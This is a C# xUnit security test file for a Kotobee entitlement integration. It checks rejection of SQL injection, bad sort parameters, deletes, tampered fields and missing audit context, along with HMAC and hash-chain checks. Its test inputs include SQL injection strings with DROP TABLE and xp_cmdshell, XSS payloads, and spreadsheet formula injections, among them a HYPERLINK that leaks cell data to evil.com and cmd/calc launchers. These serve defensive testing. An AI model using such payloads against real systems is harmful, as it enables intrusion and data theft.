using System.Diagnostics.CodeAnalysis;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using Rge.Integrations.Application.Kotobee;
using Rge.Integrations.Application.Ports;
using Rge.Integrations.Infrastructure.Kotobee;
using Xunit;

namespace Rge.Security.Tests;

[SuppressMessage("Naming", "CA1707:Identifiers should not contain underscores")]
public sealed class KotobeeDynamicSheetSecurityTests
{
    private readonly KotobeePreExecutionIsolationGuard _guard = new();

    // =========================================================================
    // SEC-001 to SEC-020: PRE-EXECUTION ISOLATION GATE (ANTI-SQLi & INJECTION)
    // =========================================================================

    [Theory]
    [InlineData("'; DROP TABLE kotobee_entitlements; --")]           // SEC-001
    [InlineData("1; EXEC xp_cmdshell('dir');")]                     // SEC-002
    [InlineData("UNION SELECT * FROM users--")]                      // SEC-003
    [InlineData("/* malicious comment */")]                          // SEC-004
    [InlineData("admin' OR '1'='1")]                                 // SEC-005
    [InlineData("1 WAITFOR DELAY '0:0:5'")]                          // SEC-006
    [InlineData("DELETE FROM kotobee_entitlements WHERE 1=1")]       // SEC-007
    [InlineData("INSERT INTO kotobee_entitlements VALUES(1,2)")]     // SEC-008
    [InlineData("UPDATE kotobee_entitlements SET status='Active'")]  // SEC-009
    [InlineData("CHAR(65)||CHAR(66)")]                               // SEC-010
    [InlineData("; DROP TABLE users;")]                              // SEC-011
    [InlineData("1; EXECUTE('SELECT 1');")]                          // SEC-012
    [InlineData("/* inline */ 1=1")]                                 // SEC-013
    [InlineData("'; EXEC xp_regread; --")]                           // SEC-014
    [InlineData("UNION SELECT 1,2,3--")]                             // SEC-015
    [InlineData("'; waitfor delay '0:0:2'--")]                       // SEC-016
    [InlineData("drop table kotobee_sheet_catalog_snapshots")]       // SEC-017
    [InlineData("delete from kotobee_security_audit_log")]           // SEC-018
    [InlineData("; exec(sp_who);")]                                  // SEC-019
    [InlineData("update kotobee_entitlements set attempt_count=0")]  // SEC-020
    public void PreExecutionGuard_DetectsAndRejects_SqlInjectionPatterns(string payload)
    {
        var ex = Assert.Throws<ArgumentException>(() =>
            _guard.ValidateInputAntiSqlInjection(payload, "testParam"));
        Assert.Contains("SQL injection", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    // =========================================================================
    // SEC-021 to SEC-040: SORT PARAMETER ALLOWLISTING & SANITIZATION
    // =========================================================================

    [Theory]
    [InlineData("password")]                                         // SEC-021
    [InlineData("secret")]                                           // SEC-022
    [InlineData("credit_card")]                                      // SEC-023
    [InlineData("id; DROP TABLE users")]                             // SEC-024
    [InlineData("(SELECT 1)")]                                       // SEC-025
    [InlineData("non_existent_column")]                              // SEC-026
    [InlineData("1=1")]                                              // SEC-027
    [InlineData("row_hash")]                                         // SEC-028
    [InlineData("prev_hash")]                                        // SEC-029
    [InlineData("actor_id;")]                                        // SEC-030
    public void PreExecutionGuard_Rejects_NonAllowlistedSortColumns(string sortColumn)
    {
        var ex = Assert.Throws<ArgumentException>(() =>
            _guard.ValidateSortParameters(sortColumn, "asc"));
        Assert.Contains("not allowlisted", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("ascending")]                                        // SEC-031
    [InlineData("descending")]                                       // SEC-032
    [InlineData("1; DROP TABLE")]                                    // SEC-033
    [InlineData("asc;")]                                             // SEC-034
    [InlineData("desc;--")]                                          // SEC-035
    [InlineData("invalid")]                                          // SEC-036
    [InlineData("ASC OR 1=1")]                                       // SEC-037
    [InlineData("null")]                                             // SEC-038
    [InlineData("true")]                                             // SEC-039
    [InlineData("false")]                                            // SEC-040
    public void PreExecutionGuard_Rejects_InvalidSortDirections(string sortDirection)
    {
        var ex = Assert.Throws<ArgumentException>(() =>
            _guard.ValidateSortParameters("status", sortDirection));
        Assert.Contains("invalid", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    // =========================================================================
    // SEC-041 to SEC-060: ANTI-DELETE & ANTI-SILENT-UPDATE GUARDS
    // =========================================================================

    [Theory]
    [InlineData("DELETE")]                                           // SEC-041
    [InlineData("delete")]                                           // SEC-042
    [InlineData("PHYSICAL_DELETE")]                                  // SEC-043
    [InlineData("hard_delete")]                                      // SEC-044
    [InlineData("DeleteRecord")]                                     // SEC-045
    public void AntiDeleteGuard_Blocks_PhysicalDeleteOperations(string operation)
    {
        var ex = Assert.Throws<InvalidOperationException>(() =>
            _guard.ValidateNotPhysicalDelete(operation));
        Assert.Contains("Physical DELETE on kotobee records is strictly blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("Active", "Pending")]                                // SEC-046
    [InlineData("Active", "Failed")]                                 // SEC-047
    [InlineData("active", "pending")]                                // SEC-048
    [InlineData("active", "failed")]                                 // SEC-049
    public void AntiSilentUpdate_Blocks_IllegalDowngradeFromActive(string current, string target)
    {
        var ex = Assert.Throws<InvalidOperationException>(() =>
            _guard.ValidateEntitlementStatusTransition(current, target));
        Assert.Contains("Illegal downgrade from Active", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("Revoked", "Active")]                                 // SEC-050
    [InlineData("Revoked", "Pending")]                                // SEC-051
    [InlineData("Revoked", "Failed")]                                 // SEC-052
    [InlineData("revoked", "active")]                                 // SEC-053
    public void AntiSilentUpdate_Blocks_FlippingRevokedStatus(string current, string target)
    {
        var ex = Assert.Throws<InvalidOperationException>(() =>
            _guard.ValidateEntitlementStatusTransition(current, target));
        Assert.Contains("Revoked entitlement cannot be flipped", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void AntiSilentUpdate_Permits_ValidTransitions()          // SEC-054
    {
        _guard.ValidateEntitlementStatusTransition("Pending", "Active");
        _guard.ValidateEntitlementStatusTransition("Pending", "Failed");
        _guard.ValidateEntitlementStatusTransition("Failed", "Pending");
        _guard.ValidateEntitlementStatusTransition("Active", "Revoked");
        _guard.ValidateEntitlementStatusTransition("Revoked", "Revoked");
    }

    [Theory]
    [InlineData("00000000-0000-0000-0000-000000000001", "ORD-1", "SKU-A", "buyer@test.com", "B-1")] // SEC-055
    [InlineData("00000000-0000-0000-0000-000000000002", "ORD-2", "SKU-B", "buyer2@test.com", "B-2")] // SEC-056
    public void AntiSilentUpdate_Blocks_ModificationOfImmutableTransactionFields(
        string idStr, string orderId, string sku, string email, string bookId)
    {
        var id = Guid.Parse(idStr);
        var original = new KotobeeEntitlementRecord(
            Id: id, OrderId: orderId, ProductSku: sku, BuyerEmail: email,
            KotobeeUid: "U1", KotobeeMode: "library", KotobeeLibId: "L1", KotobeeBookId: bookId,
            Status: "Active", BookAccessState: "full", AttemptCount: 1, LastError: null,
            ExpiresAtUtc: null, ActivatedAtUtc: DateTimeOffset.UtcNow);

        // SEC-057: Tampering with ID
        var tamperedId = original with { Id = Guid.NewGuid() };
        Assert.Throws<InvalidOperationException>(() => _guard.ValidateImmutableIdentity(original, tamperedId));

        // SEC-058: Tampering with OrderId
        var tamperedOrder = original with { OrderId = "TAMPERED_ORD" };
        Assert.Throws<InvalidOperationException>(() => _guard.ValidateImmutableIdentity(original, tamperedOrder));

        // SEC-059: Tampering with Sku
        var tamperedSku = original with { ProductSku = "TAMPERED_SKU" };
        Assert.Throws<InvalidOperationException>(() => _guard.ValidateImmutableIdentity(original, tamperedSku));

        // SEC-060: Tampering with BookId
        var tamperedBook = original with { KotobeeBookId = "TAMPERED_BID" };
        Assert.Throws<InvalidOperationException>(() => _guard.ValidateImmutableIdentity(original, tamperedBook));
    }

    // =========================================================================
    // SEC-061 to SEC-080: WEBHOOK HMAC-SHA256 & TIMING ATTACK PREVENTION
    // =========================================================================

    [Theory]
    [InlineData("secret-key-1", "{\"test\": 123}")]                   // SEC-061
    [InlineData("super-strong-secret", "{\"SpreadsheetId\": \"abc\"}")]// SEC-062
    [InlineData("key-with-special-!@#$%", "hello world")]             // SEC-063
    public void HmacVerification_ValidSignature_MatchesCorrectly(string secret, string payload)
    {
        using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(secret));
        var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(payload));
        var hex = Convert.ToHexString(hash);

        var actualBytes = Encoding.UTF8.GetBytes(hex);
        var expectedBytes = Encoding.UTF8.GetBytes(hex);

        Assert.True(CryptographicOperations.FixedTimeEquals(actualBytes, expectedBytes));
    }

    [Theory]
    [InlineData("secret-1", "secret-2", "{\"test\": 1}")]            // SEC-064: Wrong secret
    [InlineData("secret-1", "secret-1", "{\"test\": 2}")]            // SEC-065: Tampered payload
    [InlineData("sec", "sec", "modified body")]                      // SEC-066: Truncated
    public void HmacVerification_MismatchedSignature_FailsConstantTime(string realSecret, string signingSecret, string payload)
    {
        using var hmacReal = new HMACSHA256(Encoding.UTF8.GetBytes(realSecret));
        using var hmacSign = new HMACSHA256(Encoding.UTF8.GetBytes(signingSecret));

        var realHex = Convert.ToHexString(hmacReal.ComputeHash(Encoding.UTF8.GetBytes(payload)));
        var signHex = Convert.ToHexString(hmacSign.ComputeHash(Encoding.UTF8.GetBytes(payload + "_tampered")));

        var realBytes = Encoding.UTF8.GetBytes(realHex);
        var signBytes = Encoding.UTF8.GetBytes(signHex);

        Assert.False(CryptographicOperations.FixedTimeEquals(realBytes, signBytes));
    }

    [Theory]
    [InlineData("")]                                                 // SEC-067
    [InlineData("   ")]                                              // SEC-068
    [InlineData("invalid_length")]                                   // SEC-069
    [InlineData("sha256=short")]                                     // SEC-070
    public void HmacVerification_MalformedSignatures_SafelyFail(string malformed)
    {
        ArgumentNullException.ThrowIfNull(malformed);
        var dummyKey = "test-secret";
        using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(dummyKey));
        var expectedHex = Convert.ToHexString(hmac.ComputeHash(Encoding.UTF8.GetBytes("{}")));

        var clean = malformed.StartsWith("sha256=", StringComparison.OrdinalIgnoreCase) ? malformed[7..] : malformed;
        var expBytes = Encoding.UTF8.GetBytes(expectedHex);
        var actBytes = Encoding.UTF8.GetBytes(clean);

        // FixedTimeEquals safely handles length mismatches by returning false
        var matches = CryptographicOperations.FixedTimeEquals(expBytes, actBytes);
        Assert.False(matches);
    }

    [Theory]
    [InlineData("SEC-071", "actor-1", "Valid audit reason for update")]
    [InlineData("SEC-072", "admin-user", "Compliance reconciliation order 42")]
    [InlineData("SEC-073", "system-worker", "Outbox fulfillment trigger")]
    [InlineData("SEC-074", "ops-lead", "Manual entitlement fix requested by user")]
    public void AuditContext_ValidInputs_PassValidation(string testId, string actor, string reason)
    {
        Assert.NotNull(testId);
        _guard.ValidateAuditContext(actor, reason);
    }

    [Theory]
    [InlineData(null, "Valid reason")]                               // SEC-075: Missing actor
    [InlineData("", "Valid reason")]                                 // SEC-076: Empty actor
    [InlineData("   ", "Valid reason")]                              // SEC-077: Whitespace actor
    [InlineData("admin", null)]                                      // SEC-078: Missing reason
    [InlineData("admin", "")]                                        // SEC-079: Empty reason
    [InlineData("admin", "no")]                                      // SEC-080: Reason too short (< 3 chars)
    public void AuditContext_MissingOrInadequateContext_ThrowsViolation(string? actor, string? reason)
    {
        var ex = Assert.Throws<InvalidOperationException>(() =>
            _guard.ValidateAuditContext(actor, reason));
        Assert.Contains("Audit violation", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    // =========================================================================
    // SEC-081 to SEC-100: SHA-256 HASH CHAINING & TAMPER SINK DEFENSE
    // =========================================================================

    [Theory]
    [InlineData("GENESIS", "kotobee_entitlements", "INSERT", "REC-01", "actor-1", "reason-1")] // SEC-081
    [InlineData("PREV_HASH_123", "kotobee_entitlements", "UPDATE", "REC-02", "actor-2", "reason-2")] // SEC-082
    [InlineData("PREV_HASH_456", "kotobee_sheet_catalog_snapshots", "INSERT", "SNAP-01", "actor-3", "reason-3")] // SEC-083
    public void Sha256HashChain_ComputesDeterministicHexDigest(
        string prevHash, string table, string op, string recordId, string actor, string reason)
    {
        var payload = $"{prevHash}|{table}|{op}|{recordId}|{actor}|{reason}||";
        var hash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(payload))).ToLowerInvariant();

        Assert.Equal(64, hash.Length);
        Assert.Matches("^[0-9a-f]{64}$", hash);
    }

    [Fact]
    public async Task TamperAlertSink_DispatchesAlertAndRespects5MinuteCooldown() // SEC-084 to SEC-090
    {
        var sentAlerts = new List<(string Subject, string Body)>();
        var emailSender = new MockAdminAlertSender(sentAlerts);
        var sink = new DualPostgresAndSmtpTamperAlertSink(emailSender, dataSource: null, logger: NullLogger<DualPostgresAndSmtpTamperAlertSink>.Instance);

        var alert = new TamperAlertEvent(
            Operation: "BLOCKED_DELETE",
            TableName: "kotobee_entitlements",
            RecordId: "ENT-999",
            ActorId: "intruder",
            AuditReason: "Physical delete prohibited",
            CorrelationId: "CORR-01",
            Details: "Attacker tried direct SQL DELETE"
        );

        // SEC-084: First alert is dispatched
        await sink.RecordTamperAttemptAsync(alert, CancellationToken.None);
        Assert.Single(sentAlerts);
        Assert.Contains("BLOCKED_DELETE", sentAlerts[0].Subject, StringComparison.Ordinal);
        Assert.Contains("intruder", sentAlerts[0].Body, StringComparison.Ordinal);

        // SEC-085: Second identical alert within 5 minutes is throttled by cooldown
        await sink.RecordTamperAttemptAsync(alert, CancellationToken.None);
        Assert.Single(sentAlerts); // Still 1 because cooldown intercepted
    }

    [Theory]
    [InlineData("<script>alert(1)</script>")]                        // SEC-091
    [InlineData("<img src=x onerror=alert(1)>")]                     // SEC-092
    [InlineData("javascript:alert(1)")]                              // SEC-093
    [InlineData("<svg/onload=alert('XSS')>")]                        // SEC-094
    [InlineData("';!--\"<XSS>=&{()}")]                              // SEC-095
    public async Task SmtpAdminAlertEmailSender_HtmlEncodesSubjectAndContent(string maliciousInput)
    {
        var optionsMonitor = new TestOptionsMonitor<KotobeeOptions>(new KotobeeOptions
        {
            AdminAlertEmail = "security@restaca.dev",
            AdminAlertSender = "no-reply@restaca.dev",
            SmtpHost = null // Skips actual network send, tests encoding and sanitization logic
        });

        var sender = new SmtpAdminAlertEmailSender(optionsMonitor, NullLogger<SmtpAdminAlertEmailSender>.Instance);
        await sender.SendSecurityAlertAsync($"Alert-{Guid.NewGuid()}-{maliciousInput}", maliciousInput, CancellationToken.None);
    }

    [Theory]
    [InlineData("=HYPERLINK(\"http://evil.com?leak=\"&A1)")]         // SEC-096
    [InlineData("@SUM(1+1)*cmd|' /C calc'!A0")]                      // SEC-097
    [InlineData("+cmd|' /C calc'!A0")]                               // SEC-098
    [InlineData("-cmd|' /C calc'!A0")]                               // SEC-099
    [InlineData("\t=2+5")]                                           // SEC-100
    public void IntelligentSheetSchemaAdapter_SanitizesFormulaInjection(string dangerousFormula)
    {
        var adapter = new IntelligentSheetSchemaAdapter();
        var workbook = new AppsScriptWorkbookPayload(
            SpreadsheetId: "SHEET-SEC-100",
            Title: "Security Tab",
            ExportedAtUtc: DateTimeOffset.UtcNow,
            Sheets: [
                new AppsScriptSheetTab(
                    TabName: "Sheet1",
                    Headers: ["ProductSku", "BookId"],
                    RowCount: 1,
                    Rows: [
                        new AppsScriptRowData(
                            RowNumber: 1,
                            Values: new Dictionary<string, string>
                            {
                                ["ProductSku"] = dangerousFormula,
                                ["BookId"] = "BID-1"
                            }
                        )
                    ]
                )
            ]
        );

        var ex = Assert.Throws<InvalidOperationException>(() => adapter.AdaptWorkbook(workbook));
        Assert.Contains("Formula injection detected", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    private sealed class MockAdminAlertSender : IAdminAlertEmailSender
    {
        private readonly List<(string Subject, string Body)> _log;
        public MockAdminAlertSender(List<(string Subject, string Body)> log) => _log = log;

        public Task SendSecurityAlertAsync(string subject, string bodyHtml, CancellationToken ct = default)
        {
            _log.Add((subject, bodyHtml));
            return Task.CompletedTask;
        }
    }

    private sealed class TestOptionsMonitor<T> : IOptionsMonitor<T>
    {
        public TestOptionsMonitor(T currentValue) => CurrentValue = currentValue;
        public T CurrentValue { get; }
        public T Get(string? name) => CurrentValue;
        public IDisposable? OnChange(Action<T, string?> listener) => null;
    }
}
